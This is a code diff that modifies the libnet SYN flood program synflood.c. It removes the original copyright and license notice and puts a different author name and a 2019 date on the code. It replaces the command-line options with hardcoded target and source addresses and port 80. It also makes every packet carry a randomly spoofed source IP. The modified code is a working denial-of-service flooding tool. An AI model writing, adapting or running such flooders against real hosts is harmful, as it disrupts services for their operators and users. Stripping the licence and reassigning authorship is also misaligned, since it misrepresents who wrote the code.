@@ -1,32 +1,6 @@
 /*
- *  $Id: synflood.c,v 1.1.1.1 2003/06/26 21:55:11 route Exp $
- *
- *  Poseidon++ (c) 1996 - 2003 Mike D. Schiffman <mike@infonexus.com>
- *  SYN flooder rewritten for no good reason.  Again as libnet test module.
- *  Again for libnet 1.1.
- *  All rights reserved.
- *
- * Redistribution and use in source and binary forms, with or without
- * modification, are permitted provided that the following conditions
- * are met:
- * 1. Redistributions of source code must retain the above copyright
- *    notice, this list of conditions and the following disclaimer.
- * 2. Redistributions in binary form must reproduce the above copyright
- *    notice, this list of conditions and the following disclaimer in the
- *    documentation and/or other materials provided with the distribution.
- *
- * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
- * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
- * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
- * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
- * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
- * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
- * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
- * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
- * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
- * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
- * SUCH DAMAGE.
- *
+ *  $Id: synflood.c,v 1.1.1.1 2019/2/16 21:55:11 route Exp $
+ *  $Author: Matthew Todd Jeremy Geiger
  */
 
 #if (HAVE_CONFIG_H)
@@ -45,17 +19,12 @@ int main(int argc, char **argv)
 {
     u_long dst_ip = 0;
     u_long src_ip = 0;
-    u_short dst_prt = 0;
+    u_short dst_prt = 80;
     u_short src_prt = 0;
     libnet_t *l;
     libnet_ptag_t t;
-    char *cp;
     char errbuf[LIBNET_ERRBUF_SIZE];
-    int i, c, packet_amt, burst_int, burst_amt, build_ip;
-
-    packet_amt = 0;
-    burst_int = 0;
-    burst_amt = 1;
+    int c, build_ip;
 
     printf("libnet 1.1 syn flooding: TCP[raw]\n");
 
@@ -67,55 +36,12 @@ int main(int argc, char **argv)
         NULL,        /* network interface */
         errbuf);     /* error buffer */
 
+    dst_ip = libnet_name2addr4(l, "192.168.1.3", LIBNET_RESOLVE);
+    src_ip = libnet_name2addr4(l, "10.0.0.3", LIBNET_RESOLVE);
+
     if (l == NULL)
     {
         fprintf(stderr, "libnet_init() failed: %s", errbuf);
-        exit(EXIT_FAILURE);
-    }
-
-    while ((c = getopt(argc, argv, "t:a:i:b:")) != EOF)
-    {
-        switch (c)
-        {
-        /*
-             *  We expect the input to be of the form `ip.ip.ip.ip.port`.  We
-             *  point cp to the last dot of the IP address/port string and
-             *  then seperate them with a NULL byte.  The optarg now points to
-             *  just the IP address, and cp points to the port.
-             */
-        case 't':
-            if (!(cp = strrchr(optarg, '.')))
-            {
-                usage(argv[0]);
-                exit(EXIT_FAILURE);
-            }
-            *cp++ = 0;
-            dst_prt = (u_short)atoi(cp);
-            // Translate destination IP
-            if ((dst_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
-            {
-                fprintf(stderr, "Bad IP address: %s\n", optarg);
-                exit(EXIT_FAILURE);
-            }
-            break;
-        case 'a':
-            packet_amt = atoi(optarg);
-            break;
-        case 'i':
-            burst_int = atoi(optarg);
-            break;
-        case 'b':
-            burst_amt = atoi(optarg);
-            break;
-        default:
-            usage(argv[0]);
-            exit(EXIT_FAILURE);
-        }
-    }
-
-    if (!dst_prt || !dst_ip || !packet_amt)
-    {
-        usage(argv[0]);
         exit(EXIT_FAILURE);
     }
 
@@ -139,25 +65,22 @@ int main(int argc, char **argv)
             0,
             l,
             t);
+        build_ip = 0;
 
-        if (build_ip)
-        {
-            build_ip = 0;
-            libnet_build_ipv4(
-                LIBNET_TCP_H + LIBNET_IPV4_H,
-                0,
-                libnet_get_prand(LIBNET_PRu16),
-                0,
-                libnet_get_prand(LIBNET_PR8),
-                IPPROTO_TCP,
-                0,
-                src_ip = libnet_get_prand(LIBNET_PRu32),
-                dst_ip,
-                NULL,
-                0,
-                l,
-                0);
-        }
+        libnet_build_ipv4(
+            LIBNET_TCP_H + LIBNET_IPV4_H,
+            0,
+            libnet_get_prand(LIBNET_PRu16),
+            0,
+            libnet_get_prand(LIBNET_PR8),
+            IPPROTO_TCP,
+            0,
+            src_ip = libnet_get_prand(LIBNET_PRu32),
+            dst_ip,
+            NULL,
+            0,
+            l,
+            0);
         c = libnet_write(l);
         if (c == -1)
         {
